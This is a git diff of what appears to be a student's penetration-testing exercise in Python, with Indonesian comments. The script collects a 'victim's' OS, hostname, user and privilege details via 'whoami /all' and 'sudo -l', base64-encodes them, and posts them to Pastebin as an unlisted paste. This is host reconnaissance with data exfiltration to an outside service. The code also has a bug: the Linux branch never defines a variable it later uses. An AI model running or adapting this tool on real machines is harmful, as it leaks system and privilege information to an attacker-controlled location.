@@ -1,52 +1,50 @@
 # Juan Matthew - 2301852253
-    
+
+# Refrensi :
+# https://www.w3resource.com/python-exercises/python-basic-exercise-43.php
+# https://www.pythonpool.com.dream.website/get-hostname-python/
+# https://www.kite.com/python/docs/subprocess.check_output
+# https://stackoverflow.com/questions/11248224/python-subprocess-popen-result-stored-in-a-variable
+
+
+from http.client import responses
 from platform import system, platform
 import requests
 import base64
 import sys
-from subprocess import PIPE, Popen
+from subprocess import PIPE, Popen, check_output
+import socket
 
 # Deklarasi URL Pastebin dan Developer API Key 
 API_URL = "https://pastebin.com/api/api_post.php"
 API_KEY = "<DEVELOPER_API_KEY>"
 
 # Mengambil OS, Hostname ,user, group, dan privileges yang digunakan oleh victim
-result_recon = "Results\n---------------\n"
 # OS yang digunakan 
-result_recon += f"Victim's OS: {platform()}\n\n"
+result_recon = f"Victim's OS: {platform()}\n\n"
 
 if system() == "Windows":
     # Hostname
-    process = Popen("hostname", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
-    result, error = process.communicate()
+    host = (socket.gethostname())
 
     # user, group, dan privileges
-    process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
-    result, error = process.communicate()
+    user_info_1 = check_output("whoami").strip().decode('utf-8')
+    user_info_2 = check_output("whoami /all").strip().decode('utf-8')
     
 elif system() == "Linux":
     # Hostname
-    process = Popen("hostname", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
-    result, error = process.communicate()
+    host = (socket.gethostname())
     
     # user, group, dan privileges
-    process = Popen("sudo -l", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
-    result, error = process.communicate()
+    user_info_1 = check_output("sudo -l").strip().decode('utf-8')
 
-print(result_recon)
+result = result_recon + host + user_info_1 + user_info_2
 print(result)
 
-# Mengecek apakah result kosong atau tidak
-if result == b'':
-    result_recon += error.decode()
-    sys.exit(0)
-else:
-    result_recon += result.decode()
-
 # Melakukan encode Base64 kepada result
-result_recon = base64.b64encode(result_recon.encode())
+result_base = base64.b64encode(result.encode())
 print("\n Hasil Base64 Encode\n")
-print(result_recon)
+print(result_base)
 print("\n")
 
 # Body Request yang akan dikirimkan ke API Endpoint
@@ -55,7 +53,7 @@ data = {
     'api_option': 'paste', # set Paste untuk memasukan data baru ke dalam pastebin
     'api_paste_private': 1, # set pastebin ke dalam unlisted
     'api_paste_name' : "ProgPentest_Pastebin", # nama pastebin yang digunakan
-    'api_paste_code': result_recon # memasukan message ke dalam pastebin
+    'api_paste_code': result_base # memasukan message ke dalam pastebin
 }
 
 # Mengirimkan request menggunakan method POST dan menampilkan link pastebin
